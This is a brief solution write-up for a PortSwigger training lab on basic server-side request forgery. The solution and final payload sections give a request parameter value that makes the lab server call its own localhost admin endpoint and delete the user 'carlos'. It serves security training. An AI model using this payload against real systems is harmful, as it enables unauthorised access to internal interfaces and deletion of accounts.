# Lab: Basic SSRF against the local server (Apprentice)

**Lab:** [https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-localhost](https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-localhost)

**Task (from PortSwigger):**  
This lab has a stock check feature which fetches data from an internal system.

To solve the lab, change the stock check URL to access the admin interface at `http://localhost/admin` and delete the user `carlos`.

## Vulnerability
`stockApi` parameter is used by the server to fetch a URL. No validation → classic SSRF to localhost.

## Solution

1. Visit a product → Check stock → send request to Repeater.
2. Set `stockApi=http://localhost/admin` — admin UI is returned.
3. Delete carlos:

```
stockApi=http://localhost/admin/delete?username=carlos
```

## Final Payload
```
stockApi=http://localhost/admin/delete?username=carlos
```
